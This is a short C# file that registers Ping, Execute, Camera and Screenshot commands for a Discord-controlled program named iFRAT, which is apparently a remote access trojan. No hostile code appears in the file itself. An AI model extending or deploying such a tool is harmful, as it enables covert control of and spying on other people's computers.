using Masked.DiscordNet;

namespace iFRAT.Commands;

public static class CommandLoader
{
    public static CommandHelper LoadCommands(CommandHelper commandHelper)
    {
        commandHelper.AddToCommandList(Ping.GlobalInstance);

        commandHelper.AddToCommandList(Execute.GlobalInstance);

        commandHelper.AddToCommandList(Camera.GlobalInstance);

        commandHelper.AddToCommandList(Screenshot.GlobalInstance);

        return commandHelper;
    }
}